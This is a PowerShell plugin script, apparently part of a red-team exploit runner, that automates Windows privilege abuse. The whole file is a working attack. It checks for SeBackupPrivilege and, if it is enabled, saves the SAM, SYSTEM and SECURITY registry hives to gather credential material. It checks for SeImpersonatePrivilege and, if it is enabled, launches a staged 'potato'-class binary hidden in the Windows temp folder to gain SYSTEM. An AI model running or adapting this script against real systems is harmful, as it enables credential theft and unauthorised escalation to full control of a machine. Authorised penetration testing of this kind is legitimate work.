<#
.SYNOPSIS
  v0503_token_abuse.ps1 - Plugin for V-05-priv (T1134 / T1003.002)
  Consumed by exploit_runner.ps1 (canonical runner, phase 06).
  Subcommands: validate | execute
#>
$VectorId  = 'V-05-PRIV'
$Technique = 'T1134'
$EvidDir   = if ($env:EVID_DIR) { $env:EVID_DIR } else { '.\tok_evidence' }

function Get-EnabledPrivs {
    # contract: privilege must be ENABLED, not merely listed (phase-05 doctrine)
    (whoami /priv) | ForEach-Object {
        if ($_ -match '\*(Se\w+)\s+Enabled') { $Matches[1] }
    }
}

switch ($args[0]) {
    'validate' {
        New-Item -ItemType Directory -Force -Path $EvidDir | Out-Null
        $privs = Get-EnabledPrivs
        $privs | Out-File (Join-Path $EvidDir 'privileges.txt') -Encoding UTF8
        $branch = if ($privs -contains 'SeBackupPrivilege') { 'sebackup' }
                  elseif ($privs -contains 'SeImpersonatePrivilege') { 'seimpersonate' }
                  else { 'none' }
        "branch=$branch" | Out-File (Join-Path $EvidDir 'validation.txt') -Encoding UTF8
        if ($branch -eq 'none') { exit 3 }
        exit 0
    }
    'execute' {
        New-Item -ItemType Directory -Force -Path $EvidDir | Out-Null
        $privs = Get-EnabledPrivs
        $branch = if ($privs -contains 'SeBackupPrivilege') { 'sebackup' }
                  elseif ($privs -contains 'SeImpersonatePrivilege') { 'seimpersonate' }
                  else { 'none' }

        if ($branch -eq 'none') {
            @{ outcome = 'execution_failed'; reason = 'no exploitable privilege enabled' } |
                ConvertTo-Json | Out-File (Join-Path $EvidDir 'outcome.json') -Encoding UTF8
            exit 4
        }

        "### proof-of-execution ts=$([DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ssZ')) vector=$VectorId branch=$branch" |
            Out-File (Join-Path $EvidDir 'execution_proof.txt') -Encoding UTF8

        if ($branch -eq 'sebackup') {
            # SeBackupPrivilege -> registry hive recovery via robocopy /b (backup semantics)
            $dst = Join-Path $EvidDir 'hives'
            New-Item -ItemType Directory -Force -Path $dst | Out-Null
            # save hives via backup privilege (reg save honors SeBackup with proper token use)
            foreach ($hive in 'HKLM\SAM','HKLM\SYSTEM','HKLM\SECURITY') {
                $name = ($hive -split '\\')[-1]
                reg save $hive (Join-Path $dst "$name.hive") /y 2>&1 |
                    Out-File (Join-Path $EvidDir "regsave_$name.log") -Encoding UTF8
            }
            $ok = (Test-Path (Join-Path $dst 'SYSTEM.hive'))
            if ($ok) {
                # proof: hashes of hives (content NOT exfiltrated in clear - doctrine)
                Get-ChildItem $dst | ForEach-Object {
                    "$($_.Name) sha256=$([System.BitConverter]::ToString(
                        [System.Security.Cryptography.SHA256]::Create().ComputeHash(
                            [IO.File]::ReadAllBytes($_.FullName))).Replace('-','').Substring(0,16))..."
                } | Out-File (Join-Path $EvidDir 'execution_proof.txt') -Append -Encoding UTF8
                @{ outcome = 'context_obtained'; class = 'credential_material'; branch = 'sebackup' } |
                    ConvertTo-Json | Out-File (Join-Path $EvidDir 'outcome.json') -Encoding UTF8
                exit 0
            }
            @{ outcome = 'execution_failed'; reason = 'hive save failed - token not elevated for backup semantics' } |
                ConvertTo-Json | Out-File (Join-Path $EvidDir 'outcome.json') -Encoding UTF8
            exit 4
        }

        if ($branch -eq 'seimpersonate') {
            # Service-account context check: potato family is operator-staged (doctrine)
            $isService = [System.Security.Principal.WindowsIdentity]::GetCurrent().AuthenticationType -eq 'NTLM' `
                         -and (whoami) -match '^(IIS AppPool|NT AUTHORITY|NETWORK SERVICE|svc)'
            $staged = (Test-Path 'C:\Windows\Temp\.sys-potato.exe')
            @{
                service_context = [bool]$isService
                exploit_staged  = $staged
                plan = if ($staged) {
                           'execute staged binary; capture whoami/priv to proof file'
                       } else {
                           'operator stage required: SweetPotato/PrintSpoofer-class binary (see USAGE 4.2)'
                       }
            } | ConvertTo-Json | Out-File (Join-Path $EvidDir 'execution_plan.json') -Encoding UTF8

            if ($staged -and $isService) {
                & 'C:\Windows\Temp\.sys-potato.exe' "cmd /c whoami > $EvidDir\execution_proof.txt" 2>&1 |
                    Out-Null
                Start-Sleep -Seconds 3
                if ((Get-Content (Join-Path $EvidDir 'execution_proof.txt') -Raw) -match 'system') {
                    @{ outcome = 'context_obtained'; class = 'system_escalation'; branch = 'seimpersonate' } |
                        ConvertTo-Json | Out-File (Join-Path $EvidDir 'outcome.json') -Encoding UTF8
                    exit 0
                }
            }
            @{ outcome = 'execution_failed'; reason = "service_context=$isService staged=$staged" } |
                ConvertTo-Json | Out-File (Join-Path $EvidDir 'outcome.json') -Encoding UTF8
            exit 4
        }
    }
    default { exit 2 }
}
